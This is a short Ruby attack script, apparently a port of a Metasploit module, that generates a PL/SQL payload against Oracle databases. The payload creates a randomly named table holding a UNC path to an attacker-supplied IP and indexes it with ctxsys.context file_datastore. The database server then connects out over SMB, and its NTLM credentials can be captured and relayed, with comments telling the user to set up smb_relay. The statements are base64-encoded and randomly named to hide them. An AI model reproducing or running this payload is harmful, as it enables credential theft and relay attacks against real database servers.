#!/usr/bin/env ruby
#Credit to Metasploit module creator - Sh2kerr <research[ad]dsecrg.com>
#https://www.rapid7.com/db/modules/auxiliary/admin/oracle/ora_ntlm_stealer
#Be sure to do gem install ruby-oci8 - follow https://stackoverflow.com/questions/20084783/how-to-install-ruby-oci8-the-ruby-client-for-oracle-on-debian-based-systems-al
#Set up smb_relay and upload SQL from running sql_ntlmrelay.rb 

require 'rex'


if ARGV[0].nil?
  puts "Usage: ./sql_ntlmrelay.rb <IP>"
  exit
end


def run
  name1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
  name2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
  rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
  rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
  rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)


  prepare  = "CREATE TABLE #{name1} (id NUMBER PRIMARY KEY,path VARCHAR(255) UNIQUE,col_format VARCHAR(6))"
  prepare1 = "INSERT INTO #{name1} VALUES (1, '\\\\#{ARGV[0]}\\SHARE', NULL)"


  exploiting1 = "CREATE INDEX #{name2} ON #{name1}(path) INDEXTYPE IS ctxsys.context PARAMETERS ('datastore ctxsys.file_datastore format column col_format')"


  prp  = Rex::Text.encode_base64(prepare)
  prp1 = Rex::Text.encode_base64(prepare1)
  exp1 = Rex::Text.encode_base64(exploiting1)


  sql = %Q|
    DECLARE
    #{rand1} VARCHAR2(32767);
    #{rand2} VARCHAR2(32767);
    #{rand3} VARCHAR2(32767);
    BEGIN
    #{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp}')));
    EXECUTE IMMEDIATE #{rand1};
    #{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp1}')));
    EXECUTE IMMEDIATE #{rand2};
    #{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp1}')));
    EXECUTE IMMEDIATE #{rand3};
    END;
    |


  begin
    print sql
  rescue => e
    puts e
  end


end


run
